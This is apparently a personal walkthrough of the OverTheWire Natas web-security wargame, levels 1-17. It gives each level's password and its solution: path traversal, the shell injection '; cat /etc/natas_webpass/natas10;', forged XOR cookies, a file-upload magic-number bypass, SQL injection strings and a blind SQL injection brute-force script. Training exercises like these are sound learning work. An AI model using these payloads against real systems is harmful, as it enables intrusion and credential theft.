# Overthewire - Natas

createdAt: "2018-02-26T13:42:55.141Z"

***Natas1**: gtVrDuiDfck831PqWsLEZy5gyDz1clto

Solution: View Source

**Natas2**: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 
open developer bar or disable javascript

**Natas3**: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

* View source
* There's a link to files/pixel.png
* Inspect   /files folder
* Password is in /files/users.txt

**Natas4**: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

View Source. Comment "Not even google will find it

Look @ robots.txt => open /s3cr3t => /s3cr3t/users.txt

**Natas5**: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Get an extension to spoof the referer HTTP header 
In firefox HTTPrequester works fine

**Natas6**: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

Find the cookie called loggedIn and change value to 1

**Natas7**: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

In the code of the page see, that code is included from

includes/secret.inc

Examine the response packet after from the GET includes/secret.inc
Secret = FOEIUWGHFEEUHOFUOIU

**Natas8**:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
The script calls include( $_GET["page"] ) 
A comment in the source says that the pass is stored @ /etc/natas_webpass/natas8
Call page with ?page=/etc/natas_webpass/natas8

**Natas9**: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
The code indicates that 

    $encodedSecret = "3d3d516343746d4d6d6c315669563362";
    function encodeSecret($secret) {
        return bin2hex(strrev(base64_encode($secret)));
    }
    
Which means our secret is oubWYf2kBq

    hex_to_ascii( invert_string( base64_decode ( "3d3d516343746d4d6d6c315669563362" )))

    
**Natas10**: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

The php executes the code:

    passthru("grep -i $key dictionary.txt");
    
Where `$key` comes from `$_GET["needle"]` which is the GET parameter from the textbox.

Just injecting the bash code ` ; cat /etc/natas_webpass/natas10;  ` yields the password


**Natas11**: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Same as level before except for the check:

    if(preg_match('/[;|&]/',$key)) 
    
Which disallows ; | and &  characters

Solution: exploit grep to print out the file 

    "a" /etc/natas_webpass/natas11  # Is empty
    -v "a" /etc/natas_webpass/natas11 # prints pass


**Natas12**: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

According to the php code, the program stores a json object in a cookie, but the JSON is base64-encoded and xor-encrypted with a key to be discovered

    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    
This means the expected JSON object will be something of the sort:

    {showpassword:"no","bgcolor":"#ffffff"}

We are able to modify the bgcolor component of the array through the bgcolor GET parameter to any valid color of the form `#[a-f]{6}`

Then, the JSON object is xor encrypted and base64 encoded. For these colors, the cookie is: 

* \\#ffffff: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhS **EV4sFxFeaAw=**
* \\#222222: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhS **RQp4Q0UKaAw=**

Where the last characters putatively correspond to `ffffff"}` and `222222"}`

Transforming  `xor( 'ffffff"}' , base_decode("EV4sFxFeaAw=" )` yields us w8Jqw8Jq meaning 

Xor encryption key = "qw8J"

Craft new cookie - python3 code

```python
import base64
from itertools import cycle
cookie = base64.b64decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=")
decoded = []
for x,y in zip(cookie,cycle(bytes("qw8J","ascii"))):
    decoded.append( chr(x^y) )
print("".join(decoded))

#Craft new cookie
new_json = '{"showpassword":"yes","bgcolor":"#ffffff"}'
encoded = []
for x,y in zip(bytes(new_json,"ascii"),cycle(bytes("qw8J","ascii"))):
    encoded.append( chr(x^y) )

new_cookie = base64.b64encode(bytes("".join(encoded),"ascii"))
```

New crafted cookie:

JSON object: `'{"showpassword":"yes","bgcolor":"#ffffff"}'`
Value: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Modify cookie, resubmit form !

**Natas13**: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

In the form, change the value of the field from "xxxx.jpg" to "xxx.php"
Then upload the following php file:
```php





```


**Natas14**:  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

Same as before, but script does a check on the magic number with function  `exif_check`
To fool the check, add jpeg magic number to the first four bytes of the jpeg file

The natas13.php file is identifcal to the one needed to pass natas12,

```python
magic_number=bytes([0xff,0xd8,0xff,0xe0])

out_fh = open("natas13_mn.php","wb")
out_fh.write(magic_number)

in_fh = open("natas13.php","rb")
out_fh.write(in_fh.read())
out_fh.close()
```

**Natas15**: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

SQL injection in the password field:

`" OR "1"="1`
    
**Natas16**: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

The script is vulnerable to SQL injection, but no direct way of printing the password.

=> Blind SQL injection , aka using the if else statement in the code to bruteforce the password


```python
import requests

password=""
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
a_idx = 0
while len(password) < 32:
    if a_idx == len(alphabet):
        print("Something's wrong")
        break

    password_guess = password + alphabet[a_idx]
    #LIKE BINARY is used to make LIKE case sensitive
    r = requests.get('http://natas15.natas.labs.overthewire.org/index.php?username=natas16" AND password LIKE BINARY "{}%'.format(password_guess), auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))

    if "This user exists" in str(r.content):
        print(password_guess)
        password = password_guess
        a_idx = 0
    else:
        a_idx +=1
```

***Natas17***: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

Blind SQL injection using time delays to determine the true/false server response to queries
